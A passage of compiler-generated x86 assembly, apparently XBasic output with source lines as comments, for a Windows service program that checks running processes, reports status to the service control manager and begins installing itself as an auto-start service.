; [416] f = @pProcess32Next(hSnap, &proc)
	mov	eax,d[ebp-44]			;;; i665
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.45			;;; i604
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
A.45:
	mov	d[ebp-72],eax			;;; i670
;
; [417] IF f THEN
	mov	eax,d[ebp-72]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0018.server			;;; i221
;
; [418] IF LCASE$(RTRIM$(proc.szExeFile)) == LCASE$(name) THEN
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,d[ebp-52]			;;; i665
	lea	esi,[eax+36]			;;; i308
	mov	edi,260			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.s			;;; i583
	add	esp,64			;;; i600
	mov	[ebp-68],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-68]			;;; i665
	call	%_string.compare.ss			;;; i690
	jne	>> else.0019.server			;;; i219
;
; [419] CloseHandle (hSnap)
	push	[ebp-60]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [420] CloseHandle (libHandle)
	push	[ebp-56]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [421] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func62.server			;;; i258
;
; [422] END IF
else.0019.server:
end.if.0019.server:
;
; [423] END IF
else.0018.server:
end.if.0018.server:
;
; [424] LOOP WHILE f
do.loop.0017.server:
	mov	eax,d[ebp-72]			;;; i665
	test	eax,eax			;;; i194
	jnz	< do.0017.server			;;; i195
end.do.0017.server:
;
; [425] END IF
else.0016.server:
end.if.0016.server:
;
; [426] END IF
else.0015.server:
end.if.0015.server:
;
; [427] END IF
else.0014.server:
end.if.0014.server:
;
; [429] IF hSnap THEN CloseHandle (hSnap)
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.001A.server			;;; i221
	push	[ebp-60]			;;; i674a
	call	_CloseHandle@4			;;; i619
else.001A.server:
end.if.001A.server:
;
; [430] IF libHandle THEN FreeLibrary (libHandle)
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.001B.server			;;; i221
;
; [0] EXTERNAL FUNCTION FreeLibrary (hLibModule)
	push	[ebp-56]			;;; i674a
	call	_FreeLibrary@4			;;; i619
else.001B.server:
end.if.001B.server:
;
; [432] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func62.server			;;; i258
;
; [433] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.IsProcess.server:  ;;; Function end label for Assembly Programmers.
end.func62.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  IsProcess ()  *****
;  *****
;
; [435] FUNCTION STRING GetLastErrorStr ()
.code
align 16
_GetLastErrorStr.server@0:
;  *****
;  *****  FUNCTION  GetLastErrorStr ()  *****
;  *****
func20.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func20.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.52:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.52			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
funcBody20.server:
;
; [436] STRING text
#ifdef GetLastErrorStr.text
#undef GetLastErrorStr.text
#endif
#define GetLastErrorStr.text ebp-40	; exposes local variable 'text'
;
;
; [438] FormatMessageA ($$FORMAT_MESSAGE_FROM_SYSTEM  | $$FORMAT_MESSAGE_ALLOCATE_BUFFER,0, GetLastError(), 0,&hLocal, 0,0)
;
; [0] EXTERNAL FUNCTION FormatMessageA (dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments)
	mov	eax,4096			;;; i659
	or	eax,256			;;; i763
; .xstk20.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
;
; [0] EXTERNAL FUNCTION GetLastError ()
	call	_GetLastError@0			;;; i619
; .xstk20.0001 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
#ifdef GetLastErrorStr.hLocal
#undef GetLastErrorStr.hLocal
#endif
#define GetLastErrorStr.hLocal ebp-60	; exposes local variable 'hLocal'
;
	lea	eax,[ebp-60]			;;; i642
; .xstk20.0002 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-68]			;;; i674a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	call	_FormatMessageA@28			;;; i619
;
; [439] LocalLock(hLocal)
;
; [0] EXTERNAL FUNCTION LocalLock (hMem)
	push	[ebp-60]			;;; i674a
	call	_LocalLock@4			;;; i619
;
; [440] text = RTRIM$(CSTRING$(hLocal))
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [441] LocalFree(hLocal)
;
; [0] EXTERNAL FUNCTION LocalFree (hMem)
	push	[ebp-60]			;;; i674a
	call	_LocalFree@4			;;; i619
;
; [442] RETURN text
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func20.server			;;; i258
;
; [443] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetLastErrorStr.server:  ;;; Function end label for Assembly Programmers.
end.func20.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func20.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func20.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetLastErrorStr ()  *****
;  *****
;
; [446] FUNCTION MAKELANGID(USHORT p, USHORT s)
.code
;
#ifdef MAKELANGID.p
#undef MAKELANGID.p
#endif
#define MAKELANGID.p ebp+8	; exposes function argument 'p'
;
;
#ifdef MAKELANGID.s
#undef MAKELANGID.s
#endif
#define MAKELANGID.s ebp+12	; exposes function argument 's'
;
align 16
_MAKELANGID.server@8:
;  *****
;  *****  FUNCTION  MAKELANGID ()  *****
;  *****
func63.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody63.server:
;
; [448] RETURN ((s<<10) | p)
	mov	eax,d[ebp+12]			;;; i665
	shl	eax,10			;;; i835
	mov	ebx,d[ebp+8]			;;; i665
	or	eax,ebx			;;; i763
	jmp	end.func63.server			;;; i258
;
; [449] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MAKELANGID.server:  ;;; Function end label for Assembly Programmers.
end.func63.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  MAKELANGID ()  *****
;  *****
;
; [451] FUNCTION MenuInit (lpParameter)
.code
;
#ifdef MenuInit.lpParameter
#undef MenuInit.lpParameter
#endif
#define MenuInit.lpParameter ebp+8	; exposes function argument 'lpParameter'
;
align 16
_MenuInit.server@4:
;  *****
;  *****  FUNCTION  MenuInit ()  *****
;  *****
func6E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody6E.server:
;
; [452] STATIC dhwnd
data section 'globals$statics'
align	4
%6E%dhwnd.server:	db 4 dup ?
.code
;
; [454] dhwnd = CreateDialogParamA (0,$$IDD_DIALOG1,0,0,0)
;
; [0] EXTERNAL FUNCTION CreateDialogParamA (hInstance, lpName, hWndParent, lpDialogFunc, lParamInit)
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	101			;;; i656a
	push	0			;;; i656a
	call	_CreateDialogParamA@20			;;; i619
	mov	d[%6E%dhwnd.server],eax			;;; i668
;
; [455] DialogBoxParamA (NULL,$$IDD_DIALOG1,dhwnd,&DialogProc(),0)
;
; [0] EXTERNAL FUNCTION DialogBoxParamA (hInstance, TemplateRes, hwndParent, lpDialogFunc, dwInitParam)
#ifdef MenuInit.NULL
#undef MenuInit.NULL
#endif
#define MenuInit.NULL ebp-40	; exposes local variable 'NULL'
;
	mov	eax,addr _DialogProc.server@16			;;; i599
; .xstk6E.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[%6E%dhwnd.server]			;;; i672a
	push	101			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_DialogBoxParamA@20			;;; i619
;
; [456] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func6E.server			;;; i258
;
; [457] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MenuInit.server:  ;;; Function end label for Assembly Programmers.
end.func6E.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  MenuInit ()  *****
;  *****
;
; [460] FUNCTION service_main (dwArgc, lpszArgv)
.code
;
#ifdef service_main.dwArgc
#undef service_main.dwArgc
#endif
#define service_main.dwArgc ebp+8	; exposes function argument 'dwArgc'
;
;
#ifdef service_main.lpszArgv
#undef service_main.lpszArgv
#endif
#define service_main.lpszArgv ebp+12	; exposes function argument 'lpszArgv'
;
align 16
_service_main.server@8:
;  *****
;  *****  FUNCTION  service_main ()  *****
;  *****
func65.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody65.server:
;
; [461] SHARED SERVICE_STATUS ssStatus'   current status of the service
data section 'globals$shared'
align	4
%.composites.server:	db 4 dup ?
.code
data section 'globals$shared'
align	4
%ssStatus.server:	db 4 dup ?
.code
;
; [462] SHARED SERVICE_STATUS_HANDLE sshStatusHandle
data section 'globals$shared'
align	4
%sshStatusHandle.server:	db 4 dup ?
.code
;
; [465] '   register our service control handler:
;
; [466] sshStatusHandle = RegisterServiceCtrlHandlerA( &$$ServName, &service_ctrl())
;
; [0] EXTERNAL FUNCTION RegisterServiceCtrlHandlerA (lpServiceName, lpHandlerProc)
	mov	eax,addr @_string.0075.server			;;; i642
; .xstk65.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,addr _service_ctrl.server@4			;;; i599
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	_RegisterServiceCtrlHandlerA@8			;;; i619
	mov	d[%sshStatusHandle.server],eax			;;; i668
;
; [468] '   SERVICE_STATUS members that don't change in example
;
; [469] ssStatus.dwServiceType = $$SERVICE_WIN32_OWN_PROCESS | $$SERVICE_INTERACTIVE_PROCESS
	mov	eax,16			;;; i659
	or	eax,256			;;; i763
	mov	ebx,d[%ssStatus.server]			;;; i663a
	mov	d[ebx],eax			;;; i13b
;
; [470] ssStatus.dwServiceSpecificExitCode = 0
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,0			;;; i659
	mov	d[eax+16],ebx			;;; i13b
;
; [472] '   report the status to the service control manager.
;
; [473] dwErr = 0
#ifdef service_main.dwErr
#undef service_main.dwErr
#endif
#define service_main.dwErr ebp-48	; exposes local variable 'dwErr'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [474] IF (!ReportStatusToSCMgr($$SERVICE_START_PENDING,$$NO_ERROR,3000)) THEN
	push	3000			;;; i656a
	push	0			;;; i656a
	push	2			;;; i656a
	call	func6D.server			;;; i619
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	test	eax,eax			;;; i220
	jz	>> else.001C.server			;;; i221
;
; [475] IF (sshStatusHandle) THEN
	mov	eax,d[%sshStatusHandle.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.001D.server			;;; i221
;
; [476] ReportStatusToSCMgr($$SERVICE_STOPPED,dwErr,0)
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	1			;;; i656a
	call	func6D.server			;;; i619
;
; [477] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func65.server			;;; i258
;
; [478] END IF
else.001D.server:
end.if.001D.server:
;
; [479] END IF
else.001C.server:
end.if.001C.server:
;
; [481] ServiceStart(dwArgc, lpszArgv)
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func6B.server			;;; i619
;
; [483] '   try to report the stopped status to the service control manager.
;
; [484] IF sshStatusHandle THEN ReportStatusToSCMgr($$SERVICE_STOPPED,dwErr,0)
	mov	eax,d[%sshStatusHandle.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.001E.server			;;; i221
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	1			;;; i656a
	call	func6D.server			;;; i619
else.001E.server:
end.if.001E.server:
;
; [486] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.service_main.server:  ;;; Function end label for Assembly Programmers.
end.func65.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  service_main ()  *****
;  *****
;
; [489] FUNCTION service_ctrl (dwCtrlCode)
.code
;
#ifdef service_ctrl.dwCtrlCode
#undef service_ctrl.dwCtrlCode
#endif
#define service_ctrl.dwCtrlCode ebp+8	; exposes function argument 'dwCtrlCode'
;
align 16
_service_ctrl.server@4:
;  *****
;  *****  FUNCTION  service_ctrl ()  *****
;  *****
func64.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody64.server:
;
; [490] SHARED SERVICE_STATUS ssStatus
;
; [492] '   Handle the requested control code.
;
; [493] SELECT CASE dwCtrlCode
	mov	eax,d[ebp+8]			;;; i665
; .select64.001F = ebp-40	; internal variable
	mov	d[ebp-40],eax			;;; i670
;
; [494] CASE $$SERVICE_CONTROL_STOP:
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.001F.0001.server			;;; i71
;
; [495] ReportStatusToSCMgr($$SERVICE_STOP_PENDING, $$NO_ERROR, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	3			;;; i656a
	call	func6D.server			;;; i619
;
; [496] ServiceStop()
	call	func6C.server			;;; i619
;
; [497] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func64.server			;;; i258
;
; [498] '        CASE $$SERVICE_CONTROL_INTERROGATE:
;
; [500] END SELECT
case.001F.0001.server:
end.select.001F.server:
;
; [502] ReportStatusToSCMgr(ssStatus.dwCurrentState, $$NO_ERROR, 0)
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
; .xstk64.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func6D.server			;;; i619
;
; [503] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.service_ctrl.server:  ;;; Function end label for Assembly Programmers.
end.func64.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  service_ctrl ()  *****
;  *****
;
; [505] FUNCTION ReportStatusToSCMgr (dwCurrentState,dwWin32ExitCode, dwWaitHint)
.code
;
#ifdef ReportStatusToSCMgr.dwCurrentState
#undef ReportStatusToSCMgr.dwCurrentState
#endif
#define ReportStatusToSCMgr.dwCurrentState ebp+8	; exposes function argument 'dwCurrentState'
;
;
#ifdef ReportStatusToSCMgr.dwWin32ExitCode
#undef ReportStatusToSCMgr.dwWin32ExitCode
#endif
#define ReportStatusToSCMgr.dwWin32ExitCode ebp+12	; exposes function argument 'dwWin32ExitCode'
;
;
#ifdef ReportStatusToSCMgr.dwWaitHint
#undef ReportStatusToSCMgr.dwWaitHint
#endif
#define ReportStatusToSCMgr.dwWaitHint ebp+16	; exposes function argument 'dwWaitHint'
;
align 16
_ReportStatusToSCMgr.server@12:
;  *****
;  *****  FUNCTION  ReportStatusToSCMgr ()  *****
;  *****
func6D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody6D.server:
;
; [506] SHARED SERVICE_STATUS ssStatus'   current status of the service
;
; [507] SHARED SERVICE_STATUS_HANDLE sshStatusHandle
;
; [508] STATIC dwCheckPoint
data section 'globals$statics'
align	4
%6D%dwCheckPoint.server:	db 4 dup ?
.code
;
; [511] fResult = 1
#ifdef ReportStatusToSCMgr.fResult
#undef ReportStatusToSCMgr.fResult
#endif
#define ReportStatusToSCMgr.fResult ebp-40	; exposes local variable 'fResult'
;
	mov	eax,1			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [512] dwCheckPoint = 1
	mov	eax,1			;;; i659
	mov	d[%6D%dwCheckPoint.server],eax			;;; i668
;
; [514] IF ( 1 )  THEN'   when debugging we don't report to the SCM
	mov	eax,1			;;; i659
	test	eax,eax			;;; i220
	jz	>> else.0020.server			;;; i221
;
; [516] IF (dwCurrentState == $$SERVICE_START_PENDING) THEN
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,2			;;; i684a
	jne	>> else.0021.server			;;; i219
;
; [517] ssStatus.dwControlsAccepted = 0
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,0			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [518] ELSE
	jmp	end.if.0021.server			;;; i107
else.0021.server:
;
; [519] ssStatus.dwControlsAccepted = $$SERVICE_ACCEPT_STOP
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,1			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [520] END IF
end.if.0021.server:
;
; [522] ssStatus.dwCurrentState = dwCurrentState
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [523] ssStatus.dwWin32ExitCode = dwWin32ExitCode
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,d[ebp+12]			;;; i665
	mov	d[eax+12],ebx			;;; i13b
;
; [524] ssStatus.dwWaitHint = dwWaitHint
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,d[ebp+16]			;;; i665
	mov	d[eax+24],ebx			;;; i13b
;
; [526] IF ( ( dwCurrentState == $$SERVICE_RUNNING ) || ( dwCurrentState == $$SERVICE_STOPPED ) )
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,4			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.64			;;; i467
	not	eax			;;; i468
A.64:
;+peep
	mov	ebx,d[ebp+8]			;;; i665
	cmp	ebx,1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.65			;;; i467
	not	ebx			;;; i468
A.65:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0022.server			;;; i221
;
; [527] ssStatus.dwCheckPoint = 0
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,0			;;; i659
	mov	d[eax+20],ebx			;;; i13b
;
; [528] ELSE
	jmp	end.if.0022.server			;;; i107
else.0022.server:
;
; [529] dwCheckPoint = dwCheckPoint + 1
	mov	eax,d[%6D%dwCheckPoint.server]			;;; i663a
	add	eax,1			;;; i775
	mov	d[%6D%dwCheckPoint.server],eax			;;; i668
;
; [530] ssStatus.dwCheckPoint =  dwCheckPoint
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	ebx,d[%6D%dwCheckPoint.server]			;;; i663a
	mov	d[eax+20],ebx			;;; i13b
;
; [531] END IF
end.if.0022.server:
;
; [533] ' Report the status of the service to the service control manager.
;
; [534] fResult = SetServiceStatus(sshStatusHandle, &ssStatus)
;
; [0] EXTERNAL FUNCTION SetServiceStatus (hServiceStatus, lpServiceStatus)
	mov	eax,d[%ssStatus.server]			;;; i642
	push	eax			;;; i667a
	push	[%sshStatusHandle.server]			;;; i672a
	call	_SetServiceStatus@8			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [535] END IF
else.0020.server:
end.if.0020.server:
;
; [537] RETURN fResult
	mov	eax,d[ebp-40]			;;; i665
	jmp	end.func6D.server			;;; i258
;
; [538] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ReportStatusToSCMgr.server:  ;;; Function end label for Assembly Programmers.
end.func6D.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ReportStatusToSCMgr ()  *****
;  *****
;
; [540] FUNCTION CmdInstallService()
.code
align 16
_CmdInstallService.server@0:
;  *****
;  *****  FUNCTION  CmdInstallService ()  *****
;  *****
func66.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func66.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,4				;;; ..
	xor	eax,eax			;;; ...
A.72:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.72			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,156			;;; i114a
;
funcBody66.server:
;
; [541] SC_HANDLE   schService
#ifdef CmdInstallService.schService
#undef CmdInstallService.schService
#endif
#define CmdInstallService.schService ebp-40	; exposes local variable 'schService'
;
;
; [542] SC_HANDLE   schSCManager
#ifdef CmdInstallService.schSCManager
#undef CmdInstallService.schSCManager
#endif
#define CmdInstallService.schSCManager ebp-44	; exposes local variable 'schSCManager'
;
;
; [543] STRING szPath
#ifdef CmdInstallService.szPath
#undef CmdInstallService.szPath
#endif
#define CmdInstallService.szPath ebp-48	; exposes local variable 'szPath'
;
;
; [546] szPath = GetServerPath()
	call	func14.server			;;; i619
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [547] IFZ szPath THEN
	mov	eax,[ebp-48]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.69			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0023.server			;;; i192
A.69:
;
; [548] ret = GetLastError()
#ifdef CmdInstallService.ret
#undef CmdInstallService.ret
#endif
#define CmdInstallService.ret ebp-52	; exposes local variable 'ret'
;
	call	_GetLastError@0			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [549] 'PRINT "Unable to install service, module pathname not found:",GetLastErrorStr()
;
; [550] RETURN ret
	mov	eax,d[ebp-52]			;;; i665
	jmp	end.func66.server			;;; i258
;
; [551] END IF
else.0023.server:
end.if.0023.server:
;
; [553] schSCManager = OpenSCManagerA (0,0, $$SC_MANAGER_ALL_ACCESS )
;
; [0] EXTERNAL FUNCTION OpenSCManagerA (lpMachineName, lpDatabaseName, dwDesiredAccess)
	push	983103			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	call	_OpenSCManagerA@12			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [554] IF schSCManager THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0024.server			;;; i221
;
; [555] schService = CreateServiceA (schSCManager,&$$ServName,&$$ServTitle,#SERVICE_ALL_ACCESS,$$SERVICE_WIN32_OWN_PROCESS | $$SERVICE_INTERACTIVE_PROCESS, $$SERVICE_AUTO_START, $$SERVICE_ERROR_NORMAL,&szPath, 0, 0, 0, 0, 0)
;
; [0] EXTERNAL FUNCTION CreateServiceA (hSCManager, lpServiceName, lpDisplayName, dwDesiredAccess, dwServiceType, dwStartType, dwErrorControl, lpBinaryPathName, lpLoadOrderGroup, lpdwTagId, lpDependencies, lp, lpPassword)
	mov	eax,addr @_string.0075.server			;;; i642
; .xstk66.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0077.server			;;; i642
; .xstk66.0001 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
